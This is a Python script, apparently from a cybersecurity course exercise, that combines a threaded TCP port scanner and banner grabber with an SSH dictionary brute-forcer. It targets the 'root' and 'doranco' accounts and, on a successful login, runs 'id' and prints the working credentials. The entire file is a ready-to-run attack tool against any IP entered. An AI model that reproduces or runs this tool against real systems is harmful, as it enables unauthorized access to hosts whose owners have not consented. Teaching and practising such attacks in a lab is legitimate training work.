#!/usr/bin/env python3
import sys
import socket
import threading
import time
import random
import os
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException

# Configuration
DICTIONARY_PATH = r"C:\Users\stagiaire\Documents\cours cyber\github\Cybersec\TP-01\passwords.txt"
THREAD_LIMIT = 30
SSH_TIMEOUT = 15
SCAN_TIMEOUT = 2
BANNER_TIMEOUT = 25
USERS_TO_TEST = ["root", "doranco"]
MAX_ATTEMPTS = 3
DELAY_BETWEEN_ATTEMPTS = 5


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def show_banner():
    print("""
    ###########################################
    #      Advanced SSH Pentest Tool          #
    #      Scanner + Bruteforce Combo        #
    #      Targets: root, doranco            #
    ###########################################
    """)


def show_menu():
    print("\nMain Menu:")
    print("1. Port Scanner")
    print("2. SSH Bruteforce Attack")
    print("3. Full Scan & Attack")
    print("4. Exit")
    return input("\nSelect option (1-4): ")


def get_target_info():
    clear_screen()
    target = input("Target IP: ").strip()
    start_port = int(input("Start port [1]: ") or 1)
    end_port = int(input("End port [1024]: ") or 1024)
    return target, start_port, end_port


def load_passwords():
    try:
        with open(DICTIONARY_PATH, 'r', errors='ignore') as f:
            return [pwd.strip() for pwd in f if pwd.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Dictionary file not found: {DICTIONARY_PATH}")
        sys.exit(1)


def scan_port(target, port, results):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(SCAN_TIMEOUT)
            if s.connect_ex((target, port)) == 0:
                banner = get_service_banner(target, port)
                with threading.Lock():
                    results.append((port, banner))
                    print(f"[+] Port {port}/tcp open - {banner}")
    except Exception as e:
        pass


def get_service_banner(target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(SCAN_TIMEOUT)
            s.connect((target, port))
            return s.recv(1024).decode(errors='ignore').strip() or "Unknown service"
    except:
        return "Unknown service"


def run_port_scan(target, start_port, end_port):
    results = []
    print(f"\n[SCAN] Scanning {target} (ports {start_port}-{end_port})...")

    threads = []
    for port in range(start_port, end_port + 1):
        while threading.active_count() > THREAD_LIMIT:
            time.sleep(0.1)
        t = threading.Thread(target=scan_port, args=(target, port, results))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return sorted(results, key=lambda x: x[0])


def robust_ssh_connect(target, port, username, password):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password,
                    timeout=SSH_TIMEOUT, banner_timeout=BANNER_TIMEOUT,
                    allow_agent=False, look_for_keys=False)

        # Execute test command
        stdin, stdout, stderr = ssh.exec_command('id')
        user_info = stdout.read().decode().strip()

        print("\n" + "=" * 50)
        print(f"[SUCCESS] Valid credentials found!")
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"SSH Command: ssh {username}@{target} -p {port}")
        print(f"User Info: {user_info}")
        print("=" * 50)

        ssh.close()
        return True

    except AuthenticationException:
        return False
    except (SSHException, socket.error) as e:
        print(f"\n[!] Connection error: {str(e)[:100]}")
        time.sleep(random.uniform(1, DELAY_BETWEEN_ATTEMPTS))
        return False
    except Exception as e:
        print(f"\n[!] Unexpected error: {str(e)[:100]}")
        return False


def ssh_bruteforce(target, port, passwords):
    print(f"\n[ATTACK] Starting brute force on {target}:{port}")

    for user in USERS_TO_TEST:
        print(f"\n[TESTING] Account: {user}")

        for password in passwords:
            print(f"[TRY] {user}:{password[:15]}{'...' if len(password) > 15 else ''}", end='\r', flush=True)

            for attempt in range(MAX_ATTEMPTS):
                if robust_ssh_connect(target, port, user, password):
                    return True
                elif attempt < MAX_ATTEMPTS - 1:
                    time.sleep(DELAY_BETWEEN_ATTEMPTS)

    print("\n[!] No valid credentials found")
    return False


def main():
    clear_screen()
    show_banner()

    while True:
        choice = show_menu()

        if choice == '1':  # Port Scan
            target, start_port, end_port = get_target_info()
            open_ports = run_port_scan(target, start_port, end_port)

            if open_ports:
                print("\n[RESULTS] Open ports:")
                for port, banner in open_ports:
                    print(f"- Port {port}: {banner}")
            else:
                print("\n[-] No open ports found")

            input("\nPress Enter to continue...")
            clear_screen()

        elif choice == '2':  # SSH Attack
            target = input("\nTarget IP: ").strip()
            port = int(input("SSH port [22]: ") or 22)
            passwords = load_passwords()

            ssh_bruteforce(target, port, passwords)
            input("\nPress Enter to continue...")
            clear_screen()

        elif choice == '3':  # Full Scan & Attack
            target, start_port, end_port = get_target_info()
            passwords = load_passwords()

            open_ports = run_port_scan(target, start_port, end_port)
            ssh_ports = [p for p, b in open_ports if 'ssh' in b.lower()]

            if ssh_ports:
                print("\n[SSH PORTS] Found SSH services:")
                for port in ssh_ports:
                    print(f"- Port {port}")

                for port in ssh_ports:
                    if ssh_bruteforce(target, port, passwords):
                        break
            else:
                print("\n[-] No SSH services detected")

            input("\nPress Enter to continue...")
            clear_screen()

        elif choice == '4':  # Exit
            print("\n[+] Exiting program...")
            sys.exit(0)

        else:
            print("\n[!] Invalid option")
            time.sleep(1)
            clear_screen()


if __name__ == "__main__":
    try:
        import paramiko
    except ImportError:
        print("[!] Installing paramiko...")
        import subprocess

        subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])

    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)